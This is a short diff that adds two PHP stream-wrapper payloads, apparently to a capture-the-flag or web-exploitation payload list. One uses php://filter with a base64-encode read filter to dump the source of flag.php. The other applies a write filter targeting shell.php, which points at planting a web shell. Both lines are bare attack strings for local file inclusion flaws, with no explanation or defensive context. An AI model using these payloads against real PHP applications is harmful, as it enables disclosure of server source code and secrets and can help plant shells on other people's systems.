@@ -1,0 +1,2 @@
+php://filter/read=convert.base64-encode/resource=flag.php;
+php://filter/write=convert.base64-encode/resource=shell.php;
